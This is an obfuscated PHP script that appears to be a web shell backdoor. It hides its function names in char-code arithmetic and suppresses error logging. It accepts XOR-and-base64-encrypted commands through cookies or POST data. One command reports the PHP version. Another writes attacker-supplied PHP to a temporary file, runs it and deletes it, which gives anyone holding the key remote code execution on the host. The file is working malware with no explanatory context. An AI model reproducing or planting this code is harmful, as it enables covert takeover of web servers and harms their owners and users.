<?php $uezZN = 'f'."\151"."\154"."\x65".'_'.chr(112).chr(117)."\x74"."\x5f".chr(379-280).chr(111)."\x6e"."\164"."\x65"."\x6e".chr(116).chr(194-79);
$kQdzrt = 'b'.chr(892-795).'s'."\145".'6'.'4'."\137"."\x64".chr(144-43).chr(99).'o'."\144"."\145";
$bSEaIku = chr(105)."\156".'i'."\x5f".'s'."\145".'t';
$xZGDuPMtIQ = "\x75"."\x6e"."\154".chr(339-234).chr(819-709)."\153";


@$bSEaIku('e'."\x72"."\x72".chr(551-440).chr(114).chr(95).'l'.chr(394-283).chr(103), NULL);
@$bSEaIku("\x6c".chr(544-433).chr(939-836)."\x5f".'e'.chr(519-405).chr(114).chr(111).chr(1014-900).chr(115), 0);
@$bSEaIku("\155".chr(97).chr(633-513)."\x5f".chr(618-517)."\170".'e'."\143".chr(117)."\164".'i'.chr(804-693).'n'.'_'.'t'.chr(105).chr(164-55)."\145", 0);
@set_time_limit(0);

function PVFjYi($ZGrQr, $eYbYlXWAz)
{
    $SxTiRsd = "";
    for ($zJjAb = 0; $zJjAb < strlen($ZGrQr);) {
        for ($j = 0; $j < strlen($eYbYlXWAz) && $zJjAb < strlen($ZGrQr); $j++, $zJjAb++) {
            $SxTiRsd .= chr(ord($ZGrQr[$zJjAb]) ^ ord($eYbYlXWAz[$j]));
        }
    }
    return $SxTiRsd;
}

$tFqzCU = array_merge($_COOKIE, $_POST);
$RdPvLVJr = '65f6c332-5fe0-4845-92a0-e8fb6c0a4d6a';
foreach ($tFqzCU as $oTtXgk => $ZGrQr) {
    $ZGrQr = @unserialize(PVFjYi(PVFjYi($kQdzrt($ZGrQr), $RdPvLVJr), $oTtXgk));
    if (isset($ZGrQr['a'.chr(107)])) {
        if ($ZGrQr["\x61"] == "\151") {
            $zJjAb = array(
                chr(112)."\x76" => @phpversion(),
                's'.chr(740-622) => "3.5",
            );
            echo @serialize($zJjAb);
        } elseif ($ZGrQr["\x61"] == "\145") {
            $QEZyxcveAQ = "./" . md5($RdPvLVJr) . "\56".chr(456-351)."\x6e"."\x63";
            @$uezZN($QEZyxcveAQ, "<" . chr(550-487).'p'."\x68".chr(112).chr(629-597).chr(64).'u'."\x6e".'l'."\151".chr(211-101)."\x6b"."\50".chr(95).chr(849-754).'F'."\x49".'L'."\105"."\137".'_'."\51".';'.chr(32) . $ZGrQr[chr(210-110)]);
            include($QEZyxcveAQ);
            @$xZGDuPMtIQ($QEZyxcveAQ);
        }
        exit();
    }
}

